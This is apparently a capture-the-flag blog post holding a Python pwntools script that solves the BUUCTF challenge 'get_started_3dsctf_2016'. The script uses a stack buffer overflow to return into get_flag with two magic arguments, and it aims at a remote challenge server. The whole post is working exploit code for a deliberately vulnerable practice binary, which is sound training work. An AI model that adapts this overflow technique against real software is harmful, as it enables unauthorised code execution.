+++
title = "exp1"
date = "2026-03-25"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
```python
from pwn import *  
from LibcSearcher import *  
  
local_file  = './get_started_3dsctf_2016'  
  
select = 1  
if select == 0:  
    r = process(local_file)  
else:  
    r = remote('node5.buuoj.cn',25220)  
elf = ELF(local_file)  
context.log_level = 'debug'  

get_flag=0x080489A0  
exit=0x0804E6A0  

payload=b'a'*(56)+p32(get_flag)+p32(exit)+p32(814536271)+p32(425138641)  
r.sendline(payload)  

r.recvline()  
r.interactive()
```
